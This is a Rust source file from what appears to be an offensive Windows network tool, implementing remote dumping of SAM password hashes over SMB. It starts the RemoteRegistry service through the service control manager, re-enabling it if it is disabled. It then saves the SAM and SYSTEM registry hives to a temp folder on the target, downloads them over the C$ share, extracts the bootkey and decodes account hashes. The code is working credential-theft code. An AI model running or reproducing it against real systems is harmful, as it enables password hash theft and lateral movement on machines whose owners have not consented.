//! Pure-Rust SAM / LSA dump via MS-RRP `BaseRegSaveKey` over SMB2 named pipes.
//!
//! Phase C of the cross-platform portage. Replaces the Windows-only
//! `RegConnectRegistry` + `RegSaveKey` path.
//!
//! Workflow:
//! 1. Bind WINREG pipe (`\PIPE\winreg`) with NTLMSSP PKT_PRIVACY.
//! 2. `OpenLocalMachine(KEY_ALL_ACCESS)` → hklm handle.
//! 3. `BaseRegSaveKey(hklm, "SAM", remote_path)`.
//! 4. `BaseRegSaveKey(hklm, "SYSTEM", remote_path)` (needed for bootkey).
//! 5. Download both files via SMB2 `read_full_file` on `C$`.
//! 6. Parse with existing `Hive::from_bytes` + `sam::extract_bootkey` /
//!    `sam::dump_sam_hashes`.
//! 7. Cleanup — v1 leaves temp files with a warning (DELETE arrives Phase D).
//!
//! **Prerequisite:** the target must have the `RemoteRegistry` service
//! running. If it is stopped, the first `OpenLocalMachine` will fail with
//! `ERROR_BAD_PIPE` / `STATUS_OBJECT_NAME_NOT_FOUND`.

use std::sync::{Arc, Mutex};

use netraze_dcerpc::channel::RpcChannel;
use netraze_dcerpc::interfaces::{scmr, winreg};

use super::connection::SmbCredential;
use super::hive::Hive;
use super::rpc::{SmbPipeTransport, build_binder, connect_session};
use super::sam::{self, SamHash};
use super::smb2::Smb2Session;

/// Result of a SAM dump operation.
pub struct SamDumpResult {
    pub hashes: Vec<SamHash>,
    pub errors: Vec<String>,
}

/// Result of an LSA dump operation (v1 — secrets decoder not yet ported).
pub struct LsaDumpResult {
    pub secrets: Vec<String>,
    pub errors: Vec<String>,
}

/// Ensure the `RemoteRegistry` service is running, starting it via SCMR
/// if necessary. Returns an error if the service cannot be started.
async fn start_remote_registry(
    session: &Arc<Mutex<Smb2Session>>,
    ipc: u32,
    cred: &SmbCredential,
) -> Result<(), String> {
    let pipe = Arc::new(
        SmbPipeTransport::open(session.clone(), ipc, "svcctl")
            .map_err(|e| format!("open svcctl pipe: {e}"))?,
    );

    let binder = build_binder(cred, 0);
    let mut ch = RpcChannel::bind_authenticated(pipe, scmr::uuid(), (2, 0), binder)
        .await
        .map_err(|e| format!("SCMR bind_authenticated: {e}"))?;

    // 1. Open SCManager
    let stub = scmr::encode_ropen_sc_manager_w_request(
        None,
        Some("ServicesActive\0"),
        scmr::SC_MANAGER_ACCESS,
    );
    let resp = ch
        .call(scmr::Opnum::ROpenSCManagerW as u16, &stub)
        .await
        .map_err(|e| format!("ROpenSCManagerW: {e}"))?;
    let (scm_handle, status) = scmr::decode_ropen_sc_manager_w_response(&resp)
        .map_err(|e| format!("decode ROpenSCManagerW: {e}"))?;
    if status != 0 {
        return Err(format!("ROpenSCManagerW failed with status 0x{status:08x}"));
    }

    // 2. Open RemoteRegistry service
    let stub = scmr::encode_ropen_service_w_request(
        &scm_handle,
        "RemoteRegistry\0",
        scmr::SERVICE_ACCESS_START,
    );
    let resp = ch
        .call(scmr::Opnum::ROpenServiceW as u16, &stub)
        .await
        .map_err(|e| format!("ROpenServiceW: {e}"))?;
    let (svc_handle, status) = scmr::decode_ropen_service_w_response(&resp)
        .map_err(|e| format!("decode ROpenServiceW: {e}"))?;
    if status != 0 {
        let _ = close_scm(&mut ch, &scm_handle).await;
        return Err(format!("ROpenServiceW failed with status 0x{status:08x}"));
    }

    // 3. Query status
    let mut running = false;
    let stub = scmr::encode_rquery_service_status_request(&svc_handle);
    let resp = ch
        .call(scmr::Opnum::RQueryServiceStatus as u16, &stub)
        .await
        .map_err(|e| format!("RQueryServiceStatus: {e}"))?;
    let (status_info, status) = scmr::decode_rquery_service_status_response(&resp)
        .map_err(|e| format!("decode RQueryServiceStatus: {e}"))?;
    if status != 0 {
        let _ = close_scm(&mut ch, &svc_handle).await;
        let _ = close_scm(&mut ch, &scm_handle).await;
        return Err(format!("RQueryServiceStatus failed with status 0x{status:08x}"));
    }
    if status_info.current_state == scmr::SERVICE_RUNNING {
        running = true;
    }

    // 4. Start if not running
    if !running {
        let stub = scmr::encode_rstart_service_w_request(&svc_handle, 0);
        let resp = ch
            .call(scmr::Opnum::RStartServiceW as u16, &stub)
            .await
            .map_err(|e| format!("RStartServiceW: {e}"))?;
        let start_status = scmr::decode_rstart_service_w_response(&resp)
            .map_err(|e| format!("decode RStartServiceW: {e}"))?;

        if start_status == scmr::ERROR_SERVICE_DISABLED {
            // Enable the service first, then try again.
            let stub = scmr::encode_rchange_service_config_w_request(
                &svc_handle,
                scmr::SERVICE_NO_CHANGE,
                scmr::SERVICE_DEMAND_START,
                scmr::SERVICE_NO_CHANGE,
            );
            let resp = ch
                .call(scmr::Opnum::RChangeServiceConfigW as u16, &stub)
                .await
                .map_err(|e| format!("RChangeServiceConfigW: {e}"))?;
            let (_, cfg_status) = scmr::decode_rchange_service_config_w_response(&resp)
                .map_err(|e| format!("decode RChangeServiceConfigW: {e}"))?;
            if cfg_status != 0 {
                let _ = close_scm(&mut ch, &svc_handle).await;
                let _ = close_scm(&mut ch, &scm_handle).await;
                return Err(format!(
                    "RChangeServiceConfigW failed with status 0x{cfg_status:08x}"
                ));
            }

            // Retry start
            let stub = scmr::encode_rstart_service_w_request(&svc_handle, 0);
            let resp = ch
                .call(scmr::Opnum::RStartServiceW as u16, &stub)
                .await
                .map_err(|e| format!("RStartServiceW (retry): {e}"))?;
            let start_status2 = scmr::decode_rstart_service_w_response(&resp)
                .map_err(|e| format!("decode RStartServiceW (retry): {e}"))?;
            if start_status2 != 0 && start_status2 != scmr::ERROR_SERVICE_ALREADY_RUNNING {
                let _ = close_scm(&mut ch, &svc_handle).await;
                let _ = close_scm(&mut ch, &scm_handle).await;
                return Err(format!(
                    "RStartServiceW (retry) failed with status 0x{start_status2:08x}"
                ));
            }
        } else if start_status != 0 && start_status != scmr::ERROR_SERVICE_ALREADY_RUNNING {
            let _ = close_scm(&mut ch, &svc_handle).await;
            let _ = close_scm(&mut ch, &scm_handle).await;
            return Err(format!(
                "RStartServiceW failed with status 0x{start_status:08x}"
            ));
        }

        // Poll until running (max ~10s)
        for _ in 0..20 {
            tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
            let stub = scmr::encode_rquery_service_status_request(&svc_handle);
            let resp = ch
                .call(scmr::Opnum::RQueryServiceStatus as u16, &stub)
                .await
                .map_err(|e| format!("RQueryServiceStatus (poll): {e}"))?;
            let (status_info, status) = scmr::decode_rquery_service_status_response(&resp)
                .map_err(|e| format!("decode RQueryServiceStatus (poll): {e}"))?;
            if status != 0 {
                break;
            }
            if status_info.current_state == scmr::SERVICE_RUNNING {
                running = true;
                break;
            }
        }
    }

    // 5. Cleanup
    let _ = close_scm(&mut ch, &svc_handle).await;
    let _ = close_scm(&mut ch, &scm_handle).await;

    if !running {
        return Err("RemoteRegistry service did not start within timeout".into());
    }
    Ok(())
}

/// Dump local SAM hashes via WINREG + hive parsing.
pub async fn remote_dump_sam(target: &str, cred: &SmbCredential) -> Result<SamDumpResult, String> {
    let session = Arc::new(Mutex::new(
        connect_session(target, cred).map_err(|e| format!("connect_session: {e}"))?,
    ));
    let ipc = session
        .lock()
        .map_err(|e| format!("session mutex poisoned: {e}"))?
        .tree_connect(target, "IPC$")
        .map_err(|e| format!("tree_connect IPC$: {e}"))?;

    // Open the winreg pipe. If it fails (usually because RemoteRegistry is
    // stopped), try to start the service via SCMR and retry once.
    let pipe = match SmbPipeTransport::open(session.clone(), ipc, "winreg") {
        Ok(p) => Arc::new(p),
        Err(_e) => {
            // Attempt SCMR start regardless of the exact error string — the
            // most common cause is STATUS_OBJECT_NAME_NOT_FOUND (0xC0000034).
            start_remote_registry(&session, ipc, cred).await?;
            Arc::new(
                SmbPipeTransport::open(session.clone(), ipc, "winreg")
                    .map_err(|e2| format!("open winreg pipe (after SCMR start): {e2}"))?,
            )
        }
    };

    let binder = build_binder(cred, 0);
    let mut ch = RpcChannel::bind_authenticated(pipe, winreg::uuid(), (1, 0), binder)
        .await
        .map_err(|e| format!("WINREG bind_authenticated: {e}"))?;

    // 1. OpenLocalMachine
    let stub = winreg::encode_open_local_machine_request(winreg::KEY_ALL_ACCESS);
    let resp = ch
        .call(winreg::Opnum::OpenLocalMachine as u16, &stub)
        .await
        .map_err(|e| format!("OpenLocalMachine: {e}"))?;
    let (hklm, status) = winreg::decode_open_local_machine_response(&resp)
        .map_err(|e| format!("decode OpenLocalMachine: {e}"))?;
    if status != 0 {
        return Err(format!(
            "OpenLocalMachine failed with status 0x{status:08x}. \
             Is the RemoteRegistry service running?"
        ));
    }

    // 2. Save SAM + SYSTEM hives to temp files on the target.
    let nonce = format!("{:08x}", rand::random::<u32>());
    let sam_remote = format!("Windows\\Temp\\sam_{nonce}.save");
    let system_remote = format!("Windows\\Temp\\sys_{nonce}.save");

    let stub_sam = winreg::encode_base_reg_save_key_request(&hklm, &sam_remote);
    let resp_sam = ch
        .call(winreg::Opnum::BaseRegSaveKey as u16, &stub_sam)
        .await
        .map_err(|e| format!("BaseRegSaveKey SAM: {e}"))?;
    let status_sam = winreg::decode_base_reg_save_key_response(&resp_sam)
        .map_err(|e| format!("decode BaseRegSaveKey SAM: {e}"))?;
    if status_sam != 0 {
        let _ = close_reg(&mut ch, &hklm).await;
        return Err(format!(
            "BaseRegSaveKey(SAM) failed with status 0x{status_sam:08x}"
        ));
    }

    let stub_sys = winreg::encode_base_reg_save_key_request(&hklm, &system_remote);
    let resp_sys = ch
        .call(winreg::Opnum::BaseRegSaveKey as u16, &stub_sys)
        .await
        .map_err(|e| format!("BaseRegSaveKey SYSTEM: {e}"))?;
    let status_sys = winreg::decode_base_reg_save_key_response(&resp_sys)
        .map_err(|e| format!("decode BaseRegSaveKey SYSTEM: {e}"))?;
    if status_sys != 0 {
        let _ = close_reg(&mut ch, &hklm).await;
        return Err(format!(
            "BaseRegSaveKey(SYSTEM) failed with status 0x{status_sys:08x}"
        ));
    }

    // 3. Close hklm
    let _ = close_reg(&mut ch, &hklm).await;

    // 4. Download hives via SMB2 on C$
    let sam_bytes = {
        let mut s = session
            .lock()
            .map_err(|e| format!("session mutex poisoned: {e}"))?;
        s.read_full_file(target, "C$", &sam_remote)
            .map_err(|e| format!("read SAM hive: {}", e.as_str()))?
    };

    let system_bytes = {
        let mut s = session
            .lock()
            .map_err(|e| format!("session mutex poisoned: {e}"))?;
        s.read_full_file(target, "C$", &system_remote)
            .map_err(|e| format!("read SYSTEM hive: {}", e.as_str()))?
    };

    // 5. Parse hives
    let system_hive = Hive::from_bytes(system_bytes).map_err(|e| format!("parse SYSTEM: {e}"))?;
    let bootkey =
        sam::extract_bootkey(&system_hive).map_err(|e| format!("extract bootkey: {e}"))?;

    let sam_hive = Hive::from_bytes(sam_bytes).map_err(|e| format!("parse SAM: {e}"))?;
    let hashes = sam::dump_sam_hashes(&sam_hive, &bootkey).map_err(|e| format!("dump SAM: {e}"))?;

    // 6. v1 cleanup warning — DELETE arrives in Phase D
    eprintln!(
        "WARN: Temp hive files left on {target}: {sam_remote}, {system_remote} (DELETE arrives Phase D)"
    );

    Ok(SamDumpResult {
        hashes,
        errors: Vec::new(),
    })
}

/// Dump LSA secrets (v1 stub — returns hive bytes, decryption TODO).
pub async fn remote_dump_lsa(
    _target: &str,
    _cred: &SmbCredential,
) -> Result<LsaDumpResult, String> {
    // LSA secret decryption (DPAPI policy keys, tagged secrets) is
    // multi-week work tracked separately. v1 returns an empty set with
    // a descriptive error so callers know it is intentionally unported.
    Err(
        "LSA secret dump is not yet implemented in the pure-Rust stack. \
         The SECURITY hive can be saved via BaseRegSaveKey (same pattern as SAM) \
         but the DPAPI-based decoder is not ready."
            .into(),
    )
}

/// Helper: close a WINREG handle, ignoring errors (best-effort cleanup).
async fn close_reg(ch: &mut RpcChannel, handle: &winreg::RegHandle) {
    let stub = winreg::encode_base_reg_close_key_request(handle);
    let _ = ch.call(winreg::Opnum::BaseRegCloseKey as u16, &stub).await;
}

/// Helper: close an SCMR handle, ignoring errors (best-effort cleanup).
async fn close_scm(ch: &mut RpcChannel, handle: &scmr::ScmHandle) {
    let stub = scmr::encode_rclose_service_handle_request(handle);
    let _ = ch.call(scmr::Opnum::RCloseServiceHandle as u16, &stub).await;
}
